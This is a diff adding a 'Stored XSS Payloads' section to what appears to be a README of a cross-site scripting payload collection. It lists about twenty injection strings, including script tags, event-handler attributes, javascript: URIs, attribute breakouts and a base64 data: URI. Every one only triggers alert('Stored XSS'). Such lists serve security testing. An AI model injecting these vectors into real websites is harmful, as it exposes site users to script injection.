@@ -132,3 +132,32 @@ This repository features payloads for the following XSS attack types:
 
 ---
 
+# Stored XSS Payloads
+
+### Common Stored XSS Payloads
+- `<script>alert('Stored XSS')</script>`
+- `<img src=x onerror=alert('Stored XSS')>`
+- `<svg onload=alert('Stored XSS')>`
+- `<iframe src="javascript:alert('Stored XSS')"></iframe>`
+- `<body onload=alert('Stored XSS')>`
+- `<link rel="stylesheet" href="javascript:alert('Stored XSS')">`
+- `<a href="javascript:alert('Stored XSS')">Click me</a>`
+- `<input value="" onfocus="alert('Stored XSS')">`
+- `<div onmouseover="alert('Stored XSS')">Hover me</div>`
+- `<marquee onstart="alert('Stored XSS')">Scroll me</marquee>`
+
+### Advanced Stored XSS Techniques
+- `"><img src=x onerror=alert('Stored XSS')>`
+- `"><svg onload=alert('Stored XSS')>`
+- `<img src=1 onerror='alert("Stored XSS")'>`
+- `<svg><script>alert('Stored XSS')</script>`
+- `javascript:alert('Stored XSS')`
+- `data:text/html;base64,PHNjcmlwdD5hbGVydCgnU3RvcmVkIFhTUycpPC9zY3JpcHQ+`
+- `<iframe src="javascript:alert('Stored XSS')"></iframe>`
+- `" onfocus="alert('Stored XSS')" autofocus`
+- `" onclick="alert('Stored XSS')">Click me`
+- `'><img src=x onerror=alert('Stored XSS')>`
+
+---
+
+
